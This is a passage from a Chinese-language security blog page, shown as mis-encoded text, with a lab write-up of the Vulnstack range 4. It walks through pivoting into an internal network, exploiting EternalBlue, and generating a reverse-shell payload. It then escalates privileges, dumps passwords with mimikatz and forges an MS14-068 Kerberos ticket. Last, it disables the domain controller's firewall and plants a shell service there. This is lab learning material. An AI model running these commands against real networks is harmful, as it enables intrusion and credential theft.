<li>åœ¨éœ€è¦ä»£ç†æ—¶ï¼Œæ‰§è¡Œå‘½ä»¤å¦‚ <code>proxychains4 curl http://127.0.0.1:2003/</code>  å³å¯</li>
</ol>
<h3 id="ubuntuä¿¡æ¯æ”¶é›†"><a class="markdownIt-Anchor" href="#ubuntuä¿¡æ¯æ”¶é›†">#</a> Ubuntu ä¿¡æ¯æ”¶é›†</h3>
<ol>
<li>
<p>ä»è·¯ç”±è¡¨å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªç½‘æ®µï¼Œæœ‰ä¸ª 183 ç½‘æ®µåº”è¯¥å°±æ˜¯å†…ç½‘ç½‘æ®µäº†</p>
</li>
<li>
<p>msf è¿›è¡Œä¸€æ³¢å­˜æ´»æ‰«æ</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/discovery/udp_probe<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.183.0-255</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">threads 5</span><br>run<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png" alt="" class="lazyload"></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰ 128ã€130 ä¸¤å°æœºå­ã€‚</p>
</li>
<li>
<p>æ‰«ä¸€ä¸‹ ms17-010</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span><br><span class="hljs-attribute">set</span> rhosts <span class="hljs-number">192.168.183.128</span>-<span class="hljs-number">130</span><br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png" alt="" class="lazyload"></p>
<p>å¯ä»¥çœ‹åˆ° 128 çš„ win7 å’Œ 130 çš„ winserver2008 éƒ½å¯èƒ½å­˜åœ¨æ°¸æ’ä¹‹è“ã€‚</p>
</li>
<li>
<p>å°è¯•æ‰“æ°¸æ’ä¹‹è“ï¼Œæµ‹è¯•å‘ç° 128 çš„ win7 èƒ½æ‰“é€šï¼Œ130 çš„ winserver2008 æ‰“ä¸é€šã€‚</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">setg Proxies socks5:<span class="hljs-number">10.0</span><span class="hljs-number">.5</span><span class="hljs-number">.100</span>:<span class="hljs-number">8888</span>					<span class="hljs-comment">//MSFèµ°ewçš„ä»£ç†</span><br><span class="hljs-keyword">set</span> ReverseAllowProxy <span class="hljs-comment">true</span>							//å¼€å¯åå‘ä»£ç†<br>use <span class="hljs-comment">exploit</span>/windows/<span class="hljs-comment">smb</span>/ms17_010_eternalblue<br>set payload windows/<span class="hljs-comment">x64</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.183.128</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">AutoRunScript post</span>/windows/<span class="hljs-comment">manage</span>/migrate       <span class="hljs-comment">//è‡ªåŠ¨è¿ç§»è¿›ç¨‹</span><br>run<br></code></pre></td></tr></table></figure>
<p>æˆåŠŸæ‹¿ä¸‹ shell</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png" alt="" class="lazyload"></p>
</li>
</ol>
<h3 id="win7æƒé™ç»´æŒ"><a class="markdownIt-Anchor" href="#win7æƒé™ç»´æŒ">#</a> Win7 æƒé™ç»´æŒ</h3>
<ol>
<li>
<p>è™½ç„¶æ‹¿åˆ°äº† shellï¼Œä½†æ˜¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°è¿™ä¸ª shell ç»å¸¸æ‰çº¿ï¼Œåªèƒ½æƒ³åŠæ³•å¼„ä¸ªç¨³å®šç‚¹çš„ shell</p>
</li>
<li>
<p>æ‹¿ ubuntu å½“ä½œè·³æ¿æœºï¼ŒæŠŠ frps ä¼ åˆ° ubuntu ä¸Šï¼Œä¸ä¿®æ”¹é…ç½®ï¼Œç›´æ¥æ‰§è¡Œ <code>./frps -c ./frps.ini</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png" alt="image-20211112170138230" class="lazyload"></p>
</li>
<li>
<p>æŠŠ frpc ä¸Šä¼ åˆ°è‡ªå·±çš„ CS æœåŠ¡å™¨ï¼Œä¿®æ”¹ frpc.ini åå¯åŠ¨ frpcï¼š <code>./frpc -c ./frpc.ini</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png" alt="image-20211112170249583" class="lazyload"></p>
</li>
<li>
<p>CS åˆ›å»ºä¸€ä¸ª ip ä¸º ubuntu çš„ç›‘å¬å™¨</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png" alt="image-20211112170412976" class="lazyload"></p>
</li>
<li>
<p>ç”Ÿæˆé©¬ä¼ åˆ° win7 ä¸Šæ‰§è¡Œå³å¯ä¸Šçº¿</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png" alt="image-20211112170455408" class="lazyload"></p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.128 LPORT=4455 -f exe -o mshell.exe</code></p>
<p>use exploit/multi/handler</p>
<p>set payload windows/meterpreter/reverse_tcp</p>
</li>
</ol>
<h3 id="win7ä¿¡æ¯æ”¶é›†"><a class="markdownIt-Anchor" href="#win7ä¿¡æ¯æ”¶é›†">#</a> Win7 ä¿¡æ¯æ”¶é›†</h3>
<ol>
<li>
<p><code>route print</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png" alt="image-20211112171015589" class="lazyload"></p>
</li>
<li>
<p><code>net user /domain</code></p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png" alt="" class="lazyload"></p>
<ol start="3">
<li><code>net user</code></li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png" alt="" class="lazyload"></p>
<ol start="4">
<li><code>net view</code></li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png" alt="" class="lazyload"></p>
<ol start="5">
<li><code>nslookup WIN-ENS2VR5TR3N</code></li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png" alt="image-20211112171507481" class="lazyload"></p>
<h3 id="win7ææƒ"><a class="markdownIt-Anchor" href="#win7ææƒ">#</a> Win7 ææƒ</h3>
<p>å…ˆ systeminfo æ‹¿åˆ°è¡¥ä¸åˆ—è¡¨ï¼Œä½¿ç”¨ http://bugs.hacking8.com/tiquan/ ç›´æ¥æŸ¥è¯¢å¯ç”¨ expï¼Œå‘ç° MS16-135 å¯ç”¨ï¼Œç›´æ¥æ¢¼æŒ MS16-135 ææƒä¸€æŠŠæ¢­</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png" alt="image-20211114004439133" class="lazyload"></p>
<p>æ‹¿åˆ°æ–° shellï¼Œå°è¯•ç”¨çŒ•çŒ´æ¡ƒæ‹¿å¯†ç </p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png" alt="image-20211114004938173" class="lazyload"></p>
<p><code>mimikatz sekurlsa::logonpasswords</code>  æ‹¿åˆ°æ˜æ–‡å¯†ç </p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png" alt="image-20211114005145157" class="lazyload"></p>
<h3 id="win7æ‰“åŸŸæ§"><a class="markdownIt-Anchor" href="#win7æ‰“åŸŸæ§">#</a> Win7 æ‰“åŸŸæ§</h3>
<p>åŒæ ·çš„ï¼Œä½¿ç”¨ http://bugs.hacking8.com/tiquan/ å‘ç°å¯ä»¥ç”¨ MS14-068ï¼Œå·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
<p>ç”¨æ”¶é›†åˆ°çš„ sidã€æˆå‘˜åã€å¯†ç ä¼ªé€ ç¥¨æ®</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">//ms14<span class="hljs-string">-068</span>.exe -u åŸŸæˆå‘˜å@åŸŸå.com -s åŸŸæˆå‘˜sid -d åŸŸæ§åˆ¶å™¨ipåœ°å€ -p åŸŸæˆå‘˜å¯†ç <br><br>ms14<span class="hljs-string">-068</span>.exe -u douser@DEMO.com -s S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-979886063</span><span class="hljs-string">-1111900045</span><span class="hljs-string">-1414766810</span><span class="hljs-string">-1107</span> -d 192.168.183.130 -p Dotest123<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png" alt="image-20211114010319666" class="lazyload"></p>
<p>ç”¨çŒ•çŒ´æ¡ƒæ³¨å…¥ç¥¨æ®</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">mimikatz kerberos::purge         <span class="hljs-comment">//æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ </span><br>mimikatz kerberos::list          <span class="hljs-comment">//æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯</span><br>mimikatz kerberos::ptc <span class="hljs-params">&lt;ç”Ÿæˆçš„ç¥¨æ®æ–‡ä»¶&gt;</span>   <span class="hljs-comment">//å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png" alt="image-20211114010623765" class="lazyload"></p>
<p>å°è¯•æŸ¥çœ‹åŸŸæ§çš„ C ç›˜</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">net</span> use \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N<br><span class="hljs-attribute">dir</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N\c$<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png" alt="image-20211114010832260" class="lazyload"></p>
<h3 id="åŸŸæ§ç»´æƒ"><a class="markdownIt-Anchor" href="#åŸŸæ§ç»´æƒ">#</a> åŸŸæ§ç»´æƒ</h3>
<p>å†ç”Ÿæˆä¸€ä¸ª CS é©¬ï¼Œé€šè¿‡ win7 ä¼ åˆ° DC ä¸Š</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png" alt="image-20211114011638641" class="lazyload"></p>
<p>å…³æ‰ DC çš„é˜²ç«å¢™</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N create unablefirewall binpath= <span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N start unablefirewall<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png" alt="image-20211114011840038" class="lazyload"></p>
<p>æ‰§è¡Œ shell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N create bindshell binpath= <span class="hljs-string">&quot;c:\cshell2.exe&quot;</span><br><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N start bindshell<br></code></pre></td></tr></table></figure>
<p>æ‹¿åˆ° 130 çš„æ–° shell</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png" alt="image-20211114012104545" class="lazyload"></p>
<p>çŒ•çŒ´æ¡ƒæ‹¿å¯†ç </p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz privilege::debug<br>mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png" alt="image-20211114012906263" class="lazyload"></p>
<p>æ‹¿åˆ°æ˜æ–‡å¯†ç </p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png" alt="image-20211114013013491" class="lazyload"></p>
<p>å¼€å¯ 3389</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 0 /</span>f<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png" alt="image-20211114013625435" class="lazyload"></p>
<p>ç”¨ kali çš„ RDP å·¥å…·ï¼Œèµ°ä¹‹å‰çš„ ew ä»£ç†è¿æ¥</p>
<p><code>proxychains4 rdesktop 192.168.183.130</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png" alt="image-20211114014338299" class="lazyload"></p>
<p>æˆ–è€…å…å»ä»¥ä¸Šæ­¥éª¤ï¼Œç›´æ¥ CS çš„ VNC</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png" alt="image-20211114013338451" class="lazyload"></p>
<h2 id="reference"><a class="markdownIt-Anchor" href="#reference">#</a> Reference</h2>
<p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/271892.html">https://www.freebuf.com/articles/web/271892.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/oliiiflorrr/topics/1144804">https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</a></p>
<p><a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18 / è§£å†³ ubuntu-crontab åå¼¹ shell å¤±è´¥çš„é—®é¢˜ /</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangshengxiang/p/11842326.html">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>
<p><a target="_blank" rel="noopener" href="http://www.hackdig.com/09/hack-492089.htm">http://www.hackdig.com/09/hack-492089.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/116059592">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p>

  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>M1N<br>
        <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/" title="http:&#x2F;&#x2F;blog.m1n.me&#x2F;2021&#x2F;11&#x2F;16&#x2F;%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.m1n.me&#x2F;2021&#x2F;11&#x2F;16&#x2F;%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0&#x2F;</a><br>
        
            <strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬æ–‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> åè®®è¿›è¡Œè®¸å¯
        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
    
        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
    
    
</div>

  
      <div class="nexmoe-post-footer">
          <section class="nexmoe-comment">
    <div class="valine"></div>
<script src='https://cdn.jsdelivr.net/npm/valine'></script>
<script>
    // ä½¿ç”¨æ–¹æ³• https://valine.js.org/quickstart.html
    new Valine({
        el: '.valine',
        appId: 'UzwkiNx4XBeK7X1PnP8hQnJd-gzGzoHsz',
        appKey: 'mDiKv9RewzE8lKmFySr1XEkH'
    })
</script>
</section>
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text"> å¤–ç½‘æ‰“ç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2001%E7%AB%AF%E5%8F%A3struct2"><span class="toc-number">2.1.</span> <span class="toc-text"> 2001 ç«¯å£ Struct2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2002%E7%AB%AF%E5%8F%A3tomcat"><span class="toc-number">2.2.</span> <span class="toc-text"> 2002 ç«¯å£ Tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2003%E7%AB%AF%E5%8F%A3phpmyadmin-481"><span class="toc-number">2.3.</span> <span class="toc-text"> 2003 ç«¯å£ phpMyAdmin 4.8.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B82002%E7%AB%AF%E5%8F%A3%E7%9A%84tomcat"><span class="toc-number">3.</span> <span class="toc-text"> Docker é€ƒé€¸ï¼ˆ2002 ç«¯å£çš„ Tomcatï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%9C%A8docker%E9%87%8C"><span class="toc-number">3.1.</span> <span class="toc-text"> å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨ Docker é‡Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95dirtycow%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">3.2.</span> <span class="toc-text"> å°è¯• DirtyCow æ¼æ´é€ƒé€¸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9Ecve-2019-5736"><span class="toc-number">3.3.</span> <span class="toc-text"> å°è¯• runC å®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">3.4.</span> <span class="toc-text"> å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%9D%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.4.1.</span> <span class="toc-text"> å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹ shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99ssh%E5%85%AC%E9%92%A5%E6%9D%A5%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.4.2.</span> <span class="toc-text"> å°è¯•å†™.ssh å…¬é’¥æ¥è¿æ¥</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text"> å†…ç½‘æ¸—é€</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0"><span class="toc-number">4.1.</span> <span class="toc-text"> ä¼ ğŸ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msf"><span class="toc-number">4.1.1.</span> <span class="toc-text"> MSFğŸ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">4.2.</span> <span class="toc-text"> ä»£ç†è½¬å‘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ew%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">4.2.1.</span> <span class="toc-text"> ä½¿ç”¨ ew ä»£ç†è½¬å‘</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ubuntu%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.3.</span> <span class="toc-text"> Ubuntu ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.4.</span> <span class="toc-text"> Win7 æƒé™ç»´æŒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.5.</span> <span class="toc-text"> Win7 ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E6%8F%90%E6%9D%83"><span class="toc-number">4.6.</span> <span class="toc-text"> Win7 ææƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E6%89%93%E5%9F%9F%E6%8E%A7"><span class="toc-number">4.7.</span> <span class="toc-text"> Win7 æ‰“åŸŸæ§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E7%BB%B4%E6%9D%83"><span class="toc-number">4.8.</span> <span class="toc-text"> åŸŸæ§ç»´æƒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">5.</span> <span class="toc-text"> Reference</span></a></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="å›åˆ°é¡¶éƒ¨" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
     
    <div id="nexmoe-search-space">
        <div class="search-container">
            <div class="search-header">
                <div class="search-input-container">
                    <input class="search-input" type="text" placeholder="æœç´¢" oninput="sinput();">
                </div>
                <a class="search-close" onclick="sclose();">Ã—</a>
            </div>
            <div class="search-body"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

 

<script async src="/js/app.js?v=1641283248168"></script>



<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
<script>
	$(".justified-gallery").justifiedGallery({
		rowHeight: 160,
		margins: 10,
	});
</script>


    


    <!-- CNZZ Analytics -->
<div hidden>
    <script src="//s95.cnzz.com/z_stat.php?id=1280753295&web_id=1280753295" language="JavaScript"></script>
</div>




    <!-- baidu Analytics -->
<script>
    var _hmt = _hmt || [];
    (function() {var hm = document.createElement('script');
    hm.src = 'https://hm.baidu.com/hm.js?f254d2c7295bf4323b22dfe1f8760f82';
    var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

</body>

</html>
